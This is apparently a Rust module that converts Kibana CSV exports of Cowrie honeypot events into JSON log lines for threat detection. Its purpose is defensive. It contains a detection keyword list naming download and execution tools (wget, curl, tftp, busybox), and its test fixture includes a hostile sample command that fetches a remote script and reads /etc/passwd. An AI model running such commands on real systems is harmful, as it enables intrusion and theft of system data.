// Kibana "Discover" CSV export importer.
//
// Kibana exports a table with one row per document and one column per field
// (including duplicate `.keyword` columns). This module detects such an export
// and converts each row into a JSON-lines event that the existing unified
// parser and threat detectors already understand.
//
// Honeypot exports from T-Pot / Cowrie (`eventid` column) get dedicated
// handling so failed logins, commands and file transfers are surfaced as
// meaningful messages; noisy protocol events (key exchange, version banners,
// session close) are dropped.

use serde_json::{Map, Value};

const TIMESTAMP_COLS: [&str; 3] = ["@timestamp", "timestamp", "time"];
const IP_COLS: [&str; 7] = [
    "src_ip",
    "source.ip",
    "client_ip",
    "clientip",
    "remote_addr",
    "ip",
    "geoip.ip",
];
const USER_COLS: [&str; 3] = ["username", "user", "account"];
const PASSWORD_COLS: [&str; 1] = ["password"];
const INPUT_COLS: [&str; 2] = ["input", "command"];
const EVENT_COLS: [&str; 2] = ["eventid", "event"];
const MESSAGE_COLS: [&str; 2] = ["message", "msg"];
const LEVEL_COLS: [&str; 3] = ["level", "severity", "loglevel"];

const MALWARE_HINTS: [&str; 6] = ["wget ", "curl ", "tftp ", "chmod +x", "chmod 777", "busybox"];

/// Convert an uploaded file into analyzable log lines. Non-CSV input is
/// returned unchanged.
pub fn normalize_upload(content: String) -> String {
    if is_kibana_csv(&content) {
        if let Some(converted) = csv_to_jsonl(&content) {
            if !converted.is_empty() {
                return converted;
            }
        }
    }
    content
}

/// Heuristic: the first line is a CSV header containing a timestamp column and
/// at least one event/message/IP column.
pub fn is_kibana_csv(content: &str) -> bool {
    let first = content
        .trim_start_matches('\u{feff}')
        .lines()
        .next()
        .unwrap_or("");
    if !first.contains(',') {
        return false;
    }
    let headers: Vec<String> = first
        .split(',')
        .map(|h| h.trim().trim_matches('"').to_lowercase())
        .collect();
    let has_timestamp = headers.iter().any(|h| TIMESTAMP_COLS.contains(&h.as_str()));
    let has_body = headers.iter().any(|h| {
        EVENT_COLS.contains(&h.as_str())
            || MESSAGE_COLS.contains(&h.as_str())
            || IP_COLS.contains(&h.as_str())
    });
    has_timestamp && has_body
}

/// Convert CSV rows to newline-separated JSON objects.
pub fn csv_to_jsonl(content: &str) -> Option<String> {
    let mut reader = csv::ReaderBuilder::new()
        .flexible(true)
        .from_reader(content.trim_start_matches('\u{feff}').as_bytes());

    let headers: Vec<String> = reader.headers().ok()?.iter().map(str::to_string).collect();

    let ts_i = find_col(&headers, &TIMESTAMP_COLS);
    let ip_i = find_col(&headers, &IP_COLS);
    let user_i = find_col(&headers, &USER_COLS);
    let pass_i = find_col(&headers, &PASSWORD_COLS);
    let input_i = find_col(&headers, &INPUT_COLS);
    let event_i = find_col(&headers, &EVENT_COLS);
    let msg_i = find_col(&headers, &MESSAGE_COLS);
    let level_i = find_col(&headers, &LEVEL_COLS);

    let mut out = String::new();

    for record in reader.records() {
        let Ok(record) = record else { continue };
        let get = |i: Option<usize>| -> Option<&str> {
            i.and_then(|i| record.get(i))
                .map(str::trim)
                .filter(|v| !v.is_empty() && *v != "-" && *v != "(blank)")
        };

        let ip = get(ip_i);
        let user = get(user_i);
        let event = get(event_i);

        let described = match event {
            Some(ev) if ev.starts_with("cowrie.") => describe_cowrie(
                ev,
                ip.unwrap_or("unknown"),
                user.unwrap_or("unknown"),
                get(pass_i).unwrap_or(""),
                get(input_i).unwrap_or(""),
                get(msg_i).unwrap_or(""),
            ),
            _ => generic_message(&headers, &record, ts_i, msg_i)
                .map(|m| (get(level_i).map(str::to_uppercase), m)),
        };
        let Some((level, message)) = described else { continue };

        let mut obj = Map::new();
        if let Some(ts) = get(ts_i) {
            obj.insert("timestamp".into(), Value::String(ts.to_string()));
        }
        if let Some(level) = level {
            obj.insert("level".into(), Value::String(level));
        }
        obj.insert("message".into(), Value::String(message));
        if let Some(ip) = ip {
            obj.insert("src_ip".into(), Value::String(ip.to_string()));
        }
        if let Some(user) = user {
            obj.insert("username".into(), Value::String(user.to_string()));
        }

        out.push_str(&Value::Object(obj).to_string());
        out.push('\n');
    }

    Some(out)
}

fn find_col(headers: &[String], names: &[&str]) -> Option<usize> {
    names
        .iter()
        .find_map(|n| headers.iter().position(|h| h.eq_ignore_ascii_case(n)))
}

/// Map a Cowrie event to a (level, message) pair. Returns `None` for noisy
/// protocol events that carry no security signal on their own.
fn describe_cowrie(
    event: &str,
    ip: &str,
    user: &str,
    password: &str,
    input: &str,
    msg: &str,
) -> Option<(Option<String>, String)> {
    let (level, message) = match event {
        "cowrie.login.failed" => (
            "WARN",
            format!("Failed password for {user} from {ip} - honeypot login failed (password tried: {password})"),
        ),
        "cowrie.login.success" => (
            "ERROR",
            format!("Accepted password for {user} from {ip} - honeypot login succeeded (password: {password})"),
        ),
        "cowrie.command.input" | "cowrie.command.failed" => {
            let lower = input.to_lowercase();
            let hint = if MALWARE_HINTS.iter().any(|h| lower.contains(h)) {
                " [possible malware download/execution attempt]"
            } else {
                ""
            };
            ("WARN", format!("Honeypot command from {ip}: {input}{hint}"))
        }
        "cowrie.session.file_download" | "cowrie.session.file_upload" => (
            "ERROR",
            format!("Malware file transfer attempted from {ip}: {msg}"),
        ),
        "cowrie.session.connect" => ("INFO", format!("Honeypot connection from {ip}")),
        _ => return None,
    };
    Some((Some(level.to_string()), message))
}

/// Message for non-Cowrie rows: the `message` column if present, otherwise a
/// compact `key=value` summary of the first few populated columns.
fn generic_message(
    headers: &[String],
    record: &csv::StringRecord,
    ts_i: Option<usize>,
    msg_i: Option<usize>,
) -> Option<String> {
    let clean = |v: &str| {
        let v = v.trim();
        if v.is_empty() || v == "-" || v == "(blank)" { None } else { Some(v.to_string()) }
    };

    if let Some(m) = msg_i.and_then(|i| record.get(i)).and_then(clean) {
        return Some(m);
    }

    let pairs: Vec<String> = headers
        .iter()
        .enumerate()
        .filter(|(i, h)| Some(*i) != ts_i && !h.ends_with(".keyword"))
        .filter_map(|(i, h)| record.get(i).and_then(clean).map(|v| format!("{h}={v}")))
        .take(8)
        .collect();

    if pairs.is_empty() { None } else { Some(pairs.join(" ")) }
}

#[cfg(test)]
mod tests {
    use super::*;

    const SAMPLE: &str = "\"@timestamp\",eventid,src_ip,username,password,input,message\n\
\"Sep 26, 2026 @ 19:24:15.219\",cowrie.login.failed,1.2.3.4,root,123456,-,login attempt\n\
\"Sep 26, 2026 @ 19:24:16.000\",cowrie.client.kex,1.2.3.4,-,-,-,kex\n\
\"Sep 26, 2026 @ 19:24:17.000\",cowrie.command.input,1.2.3.4,-,-,\"wget http://x/y.sh; cat /etc/passwd\",CMD\n";

    #[test]
    fn detects_kibana_csv() {
        assert!(is_kibana_csv(SAMPLE));
        assert!(!is_kibana_csv("192.168.1.1 - - [15/Jan/2024:10:23:45 +0000] \"GET / HTTP/1.1\" 200 1"));
    }

    #[test]
    fn converts_cowrie_rows_and_drops_noise() {
        let out = csv_to_jsonl(SAMPLE).unwrap();
        let lines: Vec<&str> = out.lines().collect();
        assert_eq!(lines.len(), 2);
        assert!(lines[0].contains("Failed password for root from 1.2.3.4"));
        assert!(lines[1].contains("malware") && lines[1].contains("/etc/passwd"));
    }

    #[test]
    fn non_csv_is_unchanged() {
        let s = "plain log line".to_string();
        assert_eq!(normalize_upload(s.clone()), s);
    }
}
